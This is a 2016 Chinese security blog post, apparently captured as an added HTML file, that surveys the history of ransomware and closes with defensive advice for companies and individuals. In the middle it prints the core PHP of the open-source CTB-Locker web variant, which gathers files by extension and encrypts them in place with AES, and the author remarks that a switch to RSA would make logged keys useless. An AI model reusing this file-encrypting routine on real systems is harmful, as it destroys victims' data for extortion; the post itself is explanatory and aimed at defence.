@@ -1,0 +1,421 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>安全路漫漫-勒索软件 | GNUSEC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="今天说说当今互联网的第一安全刚需: “勒索软件业务”.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全路漫漫-勒索软件">
+<meta property="og:url" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/index.html">
+<meta property="og:site_name" content="GNUSEC">
+<meta property="og:description" content="今天说说当今互联网的第一安全刚需: “勒索软件业务”.">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/CoinVault.jpg">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/CryptoLocker.jpg">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/cryptowall-3-bitcoin.png">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/CTB-Locker.jpg">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/ransomware_reveton.png">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/CTB-Locker-PHP-1.jpg">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/CTB-Locker-PHP-2.jpg">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/CTB-Locker-PHP-3.jpg">
+<meta property="og:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/hou.jpg">
+<meta property="og:updated_time" content="2016-03-07T12:02:58.146Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安全路漫漫-勒索软件">
+<meta name="twitter:description" content="今天说说当今互联网的第一安全刚需: “勒索软件业务”.">
+<meta name="twitter:image" content="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/CoinVault.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="GNUSEC" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+</head>
+<body>
+<div id="container">
+  <div id="wrap">
+    <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">GNUSEC</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">OpenSource Security Movement</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
+          <input type="submit" value="" class="search-form-submit">
+          <input name=tn type=hidden value="bds">
+          <input name=cl type=hidden value="3">
+          <input name=ct type=hidden value="2097152">
+          <input type="hidden" name="si" value="gnusec.github.io">
+        </form>
+      </div>
+    </div>
+  </div>
+</header>
+    <div class="outer">
+      <section id="main"><article id="secroad-ransomware-安全路漫漫-勒索软件" class="article article-type-secroad-ransomware" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/03/06/安全路漫漫-勒索软件/" class="article-date">
+  <time datetime="2016-03-06T09:39:15.000Z" itemprop="datePublished">2016-03-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      安全路漫漫-勒索软件
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>今天说说当今互联网的第一安全刚需: “勒索软件业务”.</strong></p>
+<a id="more"></a>
+<hr>
+<p>首先什么是<strong>勒索软件</strong>? 下面是度娘的解释:</p>
+<pre><code>勒索软件是黑客用来劫持用户资产或资源并以此为条件向用户勒索钱财的一种恶意软件。勒索软件通常会将用户系统上文档、邮件、数据库、源代码、图片、压缩文件等多种文件进行某种形式的加密操作，使之不可用，或者通过修改系统配置文件、干扰用户正常使用系统的方法使系统的可用性降低，然后通过弹出窗口、对话框或生成文本文件等的方式向用户发出勒索通知，要求用户向指定帐户汇款来获得解密文件的密码或者获得恢复系统正常运行的方法。
+</code></pre><p><strong>简而言之</strong>:<br>“我给你家的保险柜外再加了一层我的保险柜. 要开? 没问题, 拿钱来. 有钱有密码. 我就让你 HHH…”</p>
+<p>你呢, 只有三个选择:</p>
+<ul>
+<li><strong>交钱拿密码</strong>(能不能拿到就看运气了, 不过目前黑产的信誉度还是不错的)</li>
+<li><strong>不交钱</strong>(恩, 你比较厉害, 只是几个T的种子而已, 不怕不怕…)</li>
+<li><strong>垂死挣扎</strong>(某些情况可行, 不过时间就是金钱, 能耗的起的可以试试)</li>
+</ul>
+<p>99%的人或多或少都”垂死挣扎”过. 不过在<strong><a href="http://thehackernews.com/2015/10/fbi-ransomware-malware.html" target="_blank" rel="external">FBI都认栽之后</a></strong>, 大家也就都认命了.</p>
+<hr>
+<p>那勒索软件这些年的战绩到底如何呢?</p>
+<table>
+<thead>
+<tr>
+<th>时间</th>
+<th>软件名</th>
+<th>赎金</th>
+<th>相关信息</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1989</td>
+<td>PC Cyborg</td>
+<td>378$</td>
+<td>Joseph Popp 博士的 PC Cyborg 特洛伊木马程序；首次出现于 1989 年。这种特洛伊木马程序是透过软盘复制的，而那些软盘则是在一场 AIDS 研讨会中散发的。执行之后，它会修改系统的 AUTOEXEC.BAT 文件来监控电脑开机了几次。然后在系统第 90 次开机时，它会将系统中所有文件重新命名。接着透过充满威胁的“使用者授权合约 （EULA）”，告知遭到感染的使用者，必须支付给 PC Cyborg Corporation。</td>
+</tr>
+<tr>
+<td>2005</td>
+<td>TROJ_PGPCODER.A</td>
+<td>200$</td>
+<td>想打开你电脑中的文件吗？听从指示汇给我200美金，收到钱后你会拿到解码程序” 这是2005年TROJ_PGPCODER.A 木马病毒，在受害者电脑中的留言。TROJ_PGPCODER.A 勒索木马采用目前网络钓鱼和间谍程序常用的手法，在浏览网站时，趁机安装潜入受害电脑。这也是第一只被命名为“恶意勒索程序 （ransomware）”的病毒；该程序会挟持文件予以加密以便勒索，然后留下勒索信息，亦即一个 README.TXT 文件</td>
+</tr>
+<tr>
+<td>2006</td>
+<td>TROJ_CRYZIP.A</td>
+<td>300$</td>
+<td>TROJ_CRYZIP.A 会将文件压缩成有密码保护的 .ZIP 文件夹，并强迫受感染的使用者将 300 美元存入特定的 e-gold 帐户。</td>
+</tr>
+<tr>
+<td>2006</td>
+<td>TROJ_RANSOM.A</td>
+<td>10.99$</td>
+<td>它也会锁住电脑系统，但要求比较少的赎金 10.99 美元。不同的地方在于，它每隔 30 分钟宣称一次，除非支付赎金，否则就删除文件。</td>
+</tr>
+<tr>
+<td>2006</td>
+<td>TROJ_ARCHIVEUS.A</td>
+<td>75</td>
+<td>这个特洛伊木马程序非常不寻常，因为它会复制“我的文档”文件夹之下的所有文件，并将它们放在一个名为 EncryptedFiles.ALS 的文件中。然后它宣称会删除原始文件，之后，它会要求受感染的使用者到一个俄罗斯线上药局购买 75 元的东西，才能获得解密金钥。</td>
+</tr>
+<tr>
+<td>2007</td>
+<td>TSPY_KOLLAH.F</td>
+<td>300$</td>
+<td>它会绑架文件当人质。它也宣称要使用 RSA-4096 演算法来加密那些文件。它会留下 README.TXT 文件当作勒索信息，告知使用者购买价值 300 美元的软件，才能将他们的文件解密</td>
+</tr>
+<tr>
+<td>2007</td>
+<td>TROJ_GPCODE.AB</td>
+<td>150</td>
+<td>会将文件加密，并留下勒索信息 （README.ASAP.TXT）。然后使用者要被迫购买 150 元的软件，才能将自己的文件解密</td>
+</tr>
+<tr>
+<td>2008</td>
+<td>Trojan[Ransom]/Win32.FakeAV</td>
+<td>金额不等</td>
+<td>2008年左右开始在国外开始流行的勒索软件家族。该恶意代码家族的界面内容为英文,专门仿冒反病毒软件</td>
+</tr>
+<tr>
+<td>2012</td>
+<td>REVETON</td>
+<td>金额不等</td>
+<td>REVETON会假冒当地警察，让用户以为自己做了什么违法的事，然后发出带有当地执法机关标志的勒索通知，进行威胁。其受害者遍及欧洲和美国。REVETON家族还会通过遭到入侵的网站来散布，这一点也是勒索软件新增的特点。</td>
+</tr>
+<tr>
+<td>2013</td>
+<td>Cryptolocker</td>
+<td>200$-3000$</td>
+<td>它并不锁定电脑屏幕，也不会中断计算机的启动进程，而是对包括“.doc”、“.xls”和“.exe”等在内的大多数类型的个人文件进行加密，然后攻击者要求用户支付通常为200美元和3000美元不等的比特币作为赎金，以换取文件的解密密钥。</td>
+</tr>
+<tr>
+<td>2014</td>
+<td>TROJ_CRYPTRBIT.H</td>
+<td>金额不等</td>
+<td>与以往勒索软件不同的是它使用数字货币比特币来支付。之后又陆续出现各种不同的“进化”，例如有的变种会窃取受害者的比特币钱包；有的变种会使用黑暗网络浏览器来隐藏自己的行踪；而最新的变种会将用户诱导至钓鱼网站来感染用户设备。</td>
+<td>$</td>
+</tr>
+<tr>
+<td>2014-2015</td>
+<td>CoinVault,TeslaCrypt,Pacman,TOX,Chimera,Cryptowall…</td>
+<td>金额不等</td>
+<td>勒索软件无疑已经形成了一套完善的地下产业, 整个商业模式不断”推陈出新”, 甚至推出了”勒索即服务”的平台. 洗钱难度越来越低, 技术成本和犯罪成本几乎趋近于<strong>0</strong>, 同时被害者的不可抗性趋近于无限大。</td>
+</tr>
+</tbody>
+</table>
+<p>来几张靓照:<br>祝愿你们永远别碰到它们!!!</p>
+<p><strong>CoinVault</strong><br><img src="/2016/03/06/安全路漫漫-勒索软件/CoinVault.jpg" alt="CoinVault.jpg" title=""></p>
+<p><strong>CryptoLocker</strong><br><img src="/2016/03/06/安全路漫漫-勒索软件/CryptoLocker.jpg" alt="CryptoLocker.jpg" title=""></p>
+<p><strong>cryptowall</strong><br><img src="/2016/03/06/安全路漫漫-勒索软件/cryptowall-3-bitcoin.png" alt="cryptowall-3-bitcoin.png" title=""></p>
+<p><strong>CTB-Locker</strong><br><img src="/2016/03/06/安全路漫漫-勒索软件/CTB-Locker.jpg" alt="CTB-Locker.jpg" title=""></p>
+<p><strong>Reveton</strong><br><img src="/2016/03/06/安全路漫漫-勒索软件/ransomware_reveton.png" alt="ransomware_reveton.png" title=""></p>
+<hr>
+<h4 id="这么恐怖的软件实现难度很高吗"><a href="#这么恐怖的软件实现难度很高吗" class="headerlink" title="这么恐怖的软件实现难度很高吗?"></a><strong>这么恐怖的软件实现难度很高吗?</strong></h4><p>答案是: <strong>NO</strong></p>
+<p>让我们通过一款开源勒索软件，来简单了解下他们实现原理.<br><a href="https://github.com/eyecatchup/Critroni-php.git" target="_blank" rel="external">Win32/Critroni (CTB-Locker) - Web version</a></p>
+<img src="/2016/03/06/安全路漫漫-勒索软件/CTB-Locker-PHP-1.jpg" alt="CTB-Locker-PHP-1.jpg" title="">
+<img src="/2016/03/06/安全路漫漫-勒索软件/CTB-Locker-PHP-2.jpg" alt="CTB-Locker-PHP-2.jpg" title="">
+<p>只要将脚本上传到任意支持PHP的服务器上, 再传入加密密钥(这里为了演示, 直接用GET传递密钥, 实际情况可以用各种方法来避免加密密钥出现在访问日志中), 即可加密当前目录下的所有子文件夹内的特定文件(比如有价值的doc和数据库文件). </p>
+<img src="/2016/03/06/安全路漫漫-勒索软件/CTB-Locker-PHP-3.jpg" alt="CTB-Locker-PHP-3.jpg" title="">
+<p>轻轻松松访问一次, 即可永久加密你的重要文件, 如果没有解密密钥, 这台服务器上的重要文件就都废了. </p>
+
+<p>下面看看其核心代码:</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">//========================获取加密密钥=========================</span><br><span class="line"><span class="keyword">if</span> (isset($_REQUEST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">	if (!file_exists(<span class="string">'victims.txt'</span>) || file_get_contents(<span class="string">'victims.txt'</span>) === <span class="string">''</span>) &#123;</span><br><span class="line">		$extensions = explode(<span class="string">' '</span>, file_get_contents(<span class="string">'extensions.txt'</span>));</span><br><span class="line">        //获取所有指定后缀的文件名列表, 同时排除特定的文件.</span><br><span class="line">		$victims = get_files(<span class="string">'.'</span>, $extensions, <span class="number">80</span>*<span class="number">1024</span>*<span class="number">1024</span>, <span class="string">'enc_excluded'</span>);</span><br><span class="line">		$victims = array_slice($victims, <span class="number">0</span>, <span class="number">4000</span>);</span><br><span class="line">        //记录加密过的文件</span><br><span class="line">		file_put_contents(<span class="string">'victims.txt'</span>, implode(<span class="string">"\n"</span>, $victims));</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$victims = explode(<span class="string">"\n"</span>, file_get_contents(<span class="string">"victims.txt"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">    //使用提交的密钥参数, 开始加密之前列表中的所有文件.</span><br><span class="line">	encrypt_files($victims, $_REQUEST[<span class="string">'submit'</span>], $_REQUEST[<span class="string">'submit2'</span>]);</span><br><span class="line">	exit(<span class="string">"ALL_HAD_DONE"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//漂亮文件加密函数. 对传递进来的 文件名列表 files 中的所有文件, 使用 $keypass密钥进行逐个加密</span><br><span class="line"><span class="keyword">function</span> encrypt_files($files, $keypass, $keytest) &#123;</span><br><span class="line">	$allenc = file_exists(<span class="string">'allenc.txt'</span>) ? explode(<span class="string">"\n"</span>, file_get_contents(<span class="string">'allenc.txt'</span>)) : array();</span><br><span class="line">		</span><br><span class="line">	if (!file_exists(<span class="string">'test.txt'</span>) || file_get_contents(<span class="string">'test.txt'</span>) === <span class="string">''</span>) &#123;</span><br><span class="line">		echo <span class="string">'getting test files\n'</span>;</span><br><span class="line">		$cipher = create_aes_cipher($keytest);</span><br><span class="line">		$test_files = $files;</span><br><span class="line">		shuffle($test_files);</span><br><span class="line">		$test_files = array_splice($test_files, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">		foreach ($test_files as $victim) &#123;</span><br><span class="line">			crypt_file($victim, $cipher, <span class="number">1</span>);</span><br><span class="line">			file_put_contents(<span class="string">'test.txt'</span>, $victim.<span class="string">"\n"</span>, FILE_APPEND);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$test_files = explode(<span class="string">"\n"</span>, file_get_contents(<span class="string">'test.txt'</span>));</span><br><span class="line">	&#125;	</span><br><span class="line">	</span><br><span class="line">	$cipher = create_aes_cipher($keypass);</span><br><span class="line">	foreach ($files as $victim) &#123;</span><br><span class="line">		if (!in_array($victim, $allenc) &amp;&amp; !in_array($victim, $test_files)) &#123;</span><br><span class="line">        	//调用加密函数, 对单个文件进行加密</span><br><span class="line">			crypt_file($victim, $cipher, <span class="number">1</span>);</span><br><span class="line">			file_put_contents(<span class="string">'allenc.txt'</span>, $victim.<span class="string">"\n"</span>, FILE_APPEND);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">//单文件加密函数</span><br><span class="line"><span class="keyword">function</span> crypt_file($fname, $cipher, $encrypt, $chunklen=<span class="number">10240</span>) &#123;</span><br><span class="line">	echo <span class="string">"crypt_file $fname "</span>;</span><br><span class="line">	$chunklen *= <span class="number">16</span>;</span><br><span class="line">	$size = filesize($fname);</span><br><span class="line">	$file = @fopen($fname, <span class="string">'r+'</span>);</span><br><span class="line">	if ($file === false) &#123;</span><br><span class="line">		echo <span class="string">"FAILED\n"</span>;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	$seek = <span class="number">0</span>;</span><br><span class="line">	$eof = false;</span><br><span class="line">	$cipher-&gt;disablePadding();</span><br><span class="line">	$tm = time();</span><br><span class="line">    //循环读取所有文件内容加密, 再写回原文件</span><br><span class="line">	while (!$eof || (time() - $tm &gt; <span class="number">10</span>)) &#123;</span><br><span class="line">		@fseek($file, $seek);</span><br><span class="line">		$chunk = @fread($file, $chunklen);</span><br><span class="line">		$eof = $seek + strlen($chunk) &gt;= $size; #feof($file);</span><br><span class="line">		if ($eof) &#123;</span><br><span class="line">			//echo <span class="string">"eof&lt;br&gt;"</span>;</span><br><span class="line">			$cipher-&gt;enablePadding();</span><br><span class="line">		&#125;</span><br><span class="line">		$crypted = $encrypt ? $cipher-&gt;encrypt($chunk) : $cipher-&gt;decrypt($chunk);</span><br><span class="line">		@fseek($file, $seek);</span><br><span class="line">		@fwrite($file, $crypted);</span><br><span class="line">		$seek += strlen($crypted);</span><br><span class="line">		//echo <span class="string">"Seek read: $seek, readed: "</span>.strlen($chunk).<span class="string">" after crypt: "</span>.strlen($crypted).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ftruncate($file, $seek);</span><br><span class="line">	echo <span class="string">"OK truncated: $seek\n"</span>;</span><br><span class="line">	@fclose($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本套代码使用的加密算法是<a href="http://www.cnblogs.com/txw1958/p/aes.html" target="_blank" rel="external">AES对称加密算法</a>。<br>加密解密用的是同一套密钥.<br>当然稍加修改， 你也能使用RSA这类更加”<strong>安全</strong>“的非对称类加密算法。 这样就算日志中抓到了密钥， 也于事无补了。 除非使用”黑科技”否则基本就是歇菜的节奏。</p>
+<p>有趣的是, 越来越多的勒索软件, 渐渐开始注重其售后服务和市场运作， 大部分被感染的文件指示中都包含了详细的交流方法， 甚至实时聊天界面。</p>
+<p>在勒索软件大行其道的今天， 我们不禁唏嘘：还有什么比伤痛能更好的制造<strong>安全刚需</strong>呢？！</p>
+<hr>
+<h3 id="勒索软件为何这么凶！！！"><a href="#勒索软件为何这么凶！！！" class="headerlink" title="勒索软件为何这么凶！！！"></a>勒索软件为何这么凶！！！</h3><ol>
+<li><strong>技术上无解</strong>，保护人们安全的加密算法成了一柄双刃剑， 在你知道密码的时候，他是你的守护神，在你不知道密码的时候，它是就是你的”紧箍咒”. </li>
+<li><strong>人不好抓</strong>，通过”暗网”和”虚拟货币”, 攻击者可以轻松的拜托法律监管，轻而易举的将赎金收入囊中。 </li>
+<li><strong>扩散迅速</strong>， 通过针对性的操作系统漏洞或者网站漏洞，攻击者可以毫无顾忌的大范围散播勒索软件， 当然更加老练的攻击者会通过社工手段，进行定向攻击，以获取更丰厚的赎金. <code>试想你收到一份hr发来的&quot;**调薪通告**&quot;, 你会不看看？。</code></li>
+</ol>
+<p>“刀”有了, “路”有了, “对象”也有了. 这种包赚不赔的生意，在hacker看来没有不做的理由。 </p>
+<hr>
+<h3 id="那问题来了"><a href="#那问题来了" class="headerlink" title="那问题来了"></a>那问题来了</h3><h4 id="企业怎么办"><a href="#企业怎么办" class="headerlink" title="企业怎么办?"></a>企业怎么办?</h4><ol>
+<li><strong>建立安全运维标准, 启动安全部署流程</strong>. 所有的线上更新都要遵循”三方通汇原则(程序员-&gt;leader-&gt;运维)”, 运维和leader共同为线上部署流程负责. 禁止一切先部署后通汇的行为。一般的企业可以搭建自己的自动化运维平台，在任何线上数据变更之前， 由leader和运维共同验证通过(手机短信).</li>
+<li><strong>架构分离</strong>, 前后端分离, 运维架构和业务架构分离. 避免跨权行为. 该推送的推送, 该降权的降权.</li>
+<li><p><strong>及时备份</strong>, 关键数据要备份, 关键数据要备份, 关键数据要备份(重要的事情说N遍)</p>
+<img src="/2016/03/06/安全路漫漫-勒索软件/hou.jpg" alt="hou.jpg" title="">
+</li>
+<li><p><strong>监控响应</strong>, 及时监控进程行为, 和大范围的异常读写操作. 保留操作缓存, 特定文件去除写权限(这招很有用).</p>
+</li>
+<li><strong>防窜改系统</strong>, 懒人首选, 后面会有专门的文章介绍.</li>
+</ol>
+<h4 id="个人怎么办"><a href="#个人怎么办" class="headerlink" title="个人怎么办?"></a>个人怎么办?</h4><ol>
+<li><strong>公私分明</strong>, 笔者曾经看到一位仁兄笔记本上挂10多个数据库磁盘的映射. 最后还都被加密了. 我TMYSRLG了. 最后这兄弟。。。就没最后了。。。 </li>
+<li><strong>注意身心健康</strong>, 对说的就是你电脑, 陌生邮件不看, 减少使用桌面版邮件客户端(各种漏洞). 安装必要的防护软件. 所有陌生人的文件都用沙盒运行.</li>
+</ol>
+<hr>
+<h4 id="可悲的和可幸的"><a href="#可悲的和可幸的" class="headerlink" title="可悲的和可幸的"></a>可悲的和可幸的</h4><p>互联网安全的发展史就是一篇血淋林的黑暗史. 在弱肉强食的网络空间里. 只有bit和money, 伴随着每一种新型攻击技术的兴起以及地下产业链的成熟, 都会让人们对网络安全的需求达到一个新的高度. 可以预见随着个体攻防实力愈发的不对等，将会有新的平台和机构承担起基础网络安全需求的重任. 而不管今天你有没有被侵害, 只要你稍加疏忽, 你明天必将”万劫不复”. <strong>互联网不相信眼泪.</strong></p>
+<h4 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a><strong>相关链接</strong></h4><blockquote>
+<p><a href="http://internetcrimefightersorg.com/ransomware-archive/" target="_blank" rel="external">跟多相关新闻</a><br><a href="http://www.enet.com.cn/article/2010/0408/A20100408636652_3.shtml" target="_blank" rel="external">解析勒索软件ransomware的发展历程</a><br><a href="http://" target="_blank" rel="external">回看2015：那些让人心悸的勒索软件</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="http://gnusec.github.io/2016/03/06/安全路漫漫-勒索软件/" data-id="cilqira0o000b2kv7pm3uhje4" class="article-share-link" data-share="baidu">分享到</a>
+      
+
+      
+
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ransomware/">Ransomware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SECROAD/">SECROAD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/勒索软件/">勒索软件</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全路漫漫/">安全路漫漫</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/03/07/Linux下的防篡改技巧-1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">
+        
+          Linux下的防篡改技巧-1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/02/16/Good Day/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">Good day</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      
+      <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/GNU/">GNU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Life/">Life</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ransomware/">Ransomware</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SECROAD/">SECROAD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tamper-resistant-防篡改-Linux-SEnginx/">tamper-resistant, 防篡改, Linux, SEnginx</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tamper-resistant-防篡改-Linux-权限-chattr/">tamper-resistant, 防篡改, Linux, 权限, chattr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/勒索软件/">勒索软件</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全路漫漫/">安全路漫漫</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/GNU/" style="font-size: 10px;">GNU</a> <a href="/tags/Life/" style="font-size: 10px;">Life</a> <a href="/tags/Ransomware/" style="font-size: 10px;">Ransomware</a> <a href="/tags/SECROAD/" style="font-size: 10px;">SECROAD</a> <a href="/tags/tamper-resistant-防篡改-Linux-SEnginx/" style="font-size: 10px;">tamper-resistant, 防篡改, Linux, SEnginx</a> <a href="/tags/tamper-resistant-防篡改-Linux-权限-chattr/" style="font-size: 10px;">tamper-resistant, 防篡改, Linux, 权限, chattr</a> <a href="/tags/勒索软件/" style="font-size: 10px;">勒索软件</a> <a href="/tags/安全路漫漫/" style="font-size: 10px;">安全路漫漫</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">二月 2015</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">近期文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2016/03/10/Linux下的防篡改技巧-2/">Linux下的防篡改技巧-2</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/07/Linux下的防篡改技巧-1/">Linux下的防篡改技巧-1</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/06/安全路漫漫-勒索软件/">安全路漫漫-勒索软件</a>
+          </li>
+        
+          <li>
+            <a href="/2015/02/16/Good Day/">Good day</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">友情链接</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="http://www.gnu.org" target="_blank">GNU</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+      
+    </div>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Winger<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      .
+      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
+    </div>
+  </div>
+</footer>
+  </div>
+  <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+  <!-- totop start -->
+<div id="totop">
+<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+
+<!-- totop end -->
+
+
+<!-- 百度分享 start -->
+
+<div id="article-share-box" class="article-share-box">
+  <div id="bdshare" class="bdsharebuttonbox article-share-links">
+    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
+    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
+    <a class="article-share-more" data-cmd="more" title="更多"></a>
+  </div>
+</div>
